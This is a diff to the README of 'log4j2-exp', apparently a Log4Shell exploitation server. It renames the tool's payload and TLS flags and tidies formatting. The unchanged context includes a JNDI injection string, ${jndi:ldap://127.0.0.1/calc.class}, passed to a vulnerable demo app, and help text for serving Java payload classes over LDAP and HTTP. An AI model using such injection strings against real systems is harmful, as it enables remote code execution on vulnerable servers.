@@ -23,7 +23,7 @@
  * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1/calc.class}```
 
 ## Help
-  ``` 
+  ```
   :::        ::::::::   ::::::::      :::   ::::::::::: ::::::::
   :+:       :+:    :+: :+:    :+:    :+:        :+:    :+:    :+:
   +:+       +:+    +:+ +:+          +:+ +:+     +:+          +:+
@@ -35,8 +35,6 @@
                            https://github.com/For-ACGN/log4j2-exp
 
 Usage of log4j2-exp.exe:
-  -dir string
-        payload(java class) directory (default "payload")
   -host string
         server IP address or domain name (default "127.0.0.1")
   -http-addr string
@@ -47,14 +45,15 @@ Usage of log4j2-exp.exe:
         ldap server address (default ":389")
   -ldap-net string
         ldap server network (default "tcp")
-  -tls
-        enable ldaps and https server
+  -payload string
+        payload(java class) directory (default "payload")
   -tls-cert string
         tls certificate file path (default "cert.pem")
   -tls-key string
         tls private key file path (default "key.pem")
+  -tls-server
+        enable ldaps and https server
   ```
-
 
 ## Screenshot
 ![](https://github.com/For-ACGN/log4j2-exp/raw/main/screenshot.png)
